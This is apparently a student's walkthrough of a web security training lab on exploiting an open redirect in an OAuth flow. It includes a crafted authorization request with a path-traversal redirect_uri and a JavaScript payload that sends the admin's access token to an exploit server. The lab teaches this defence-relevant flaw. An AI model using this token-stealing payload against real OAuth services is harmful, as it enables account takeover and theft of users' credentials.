# Practitioner Lab 142: Stealing OAuth access tokens via an open redirect

---

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

### **Note**

You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`.

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled.png)

By looking at my responses I found this one which showed all the info on the user. This is where I think I can get the info of the admin user at the end .
I went and intercepted a new GET to the /auth and changed the URI to a place inside of the site such as my account just to see if it works.

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%201.png)

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%202.png)

It seems to have worked. Now I will try the same with the admin account.

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%203.png)

Here the token can be seen

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%204.png)

If I add a token here then it shows me the info. 

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%205.png)

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%206.png)

Found the next post which has a redirect of its own. 

Using this I can send it to the exploit server and get the token

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%207.png)

Here it redirected me to it.

```
GET /auth?client_id=q154cpex2uif5g2p1mudg&redirect_uri=https://0a170052031fd5b6806ea882009b00c2.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0f00950396d548809aa75601f60081.exploit-server.net/exploit&response_type=token&nonce=-1857682906&scope=openid%20profile%20email HTTP/2
Host: oauth-0a8b003e0390d5e380d5a6a8023c00d0.oauth-server.net
```

This payload did.

```jsx
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0ae900180448c1cf85108323020e00ac.oauth-server.net/auth?client_id=yholxgmqa2frg0rncqhxs&redirect_uri=https://0a7600b60433c1fc852785310024007e.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a26004004d6c190851c84c3014200a4.exploit-server.net/exploit&response_type=token&nonce=-1700103883&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

This may be used to get the hash.

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%208.png)

To copy any url on the request

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%209.png)

Got the token now I add this token in the /me to get the api key

![Untitled](Practitioner%20Lab%20142%20Stealing%20OAuth%20access%20tokens%20%20a7c7b37a2bd34fc3af71968550361d84/Untitled%2010.png)